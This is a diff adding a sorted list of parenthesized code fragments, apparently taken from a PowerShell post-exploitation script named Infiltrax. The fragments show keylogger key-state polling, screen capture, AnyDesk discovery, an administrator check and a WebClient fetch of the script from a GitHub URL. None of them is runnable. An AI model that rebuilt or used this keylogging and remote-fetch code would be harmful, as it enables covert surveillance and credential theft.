@@ -1,0 +1,42 @@
+"(""user32.dll"""
+"($File, [System.Drawing.Imaging.ImageFormat]::Png"
+"($Left, $Top, 0, 0, $bitmap.Size"
+"($OutputPath, $character, [System.Text.Encoding]::ASCII"
+"(the ""Software"""
+($DurationInSeconds
+($anyDeskPath
+($anydesk
+($anydesk.Version
+($bitmap
+($currentIdentity
+($graphic
+($isPressed -and (-not $previousState[$keyCode]
+($keyCode
+($keyCode -eq 16 -or $keyCode -eq 160
+($keyCode -eq 17 -or $keyCode -eq 18
+($keyCode -ge 32 -and $keyCode -le 126
+($keyCode = 8; $keyCode -le 255; $keyCode++
+($keyState -band 0x8000
+($modifiers[16] -or $modifiers[160]
+($nonPrintableKeys.ContainsKey($keyCode
+($path in $possiblePaths
+($previousState.ContainsKey($keyCode
+($shiftKeyMapping.ContainsKey($keyCode
+('https://raw.githubusercontent.com/alexdhital/Infiltrax/main/Infiltrax.ps1'
+((Get-Date
+(-not $isPressed
+(-not (Test-AdminAccess
+(Get-Date
+(Mandatory = $true
+(New-Object Net.WebClient
+(Requires Administrative Privilege
+(Split-Path -Parent $DestinationPath
+(Test-Path $path
+(Test-Path $stdoutPath
+([System.Security.Principal.WindowsBuiltInRole]::Administrator
+(c
+(default
+(get-date -f yyyy-MM-dd_HHmmss
+(https://raw.githubusercontent.com/alexdhital/Infiltrax/main/usage.gif
+(int vKey
+(x86
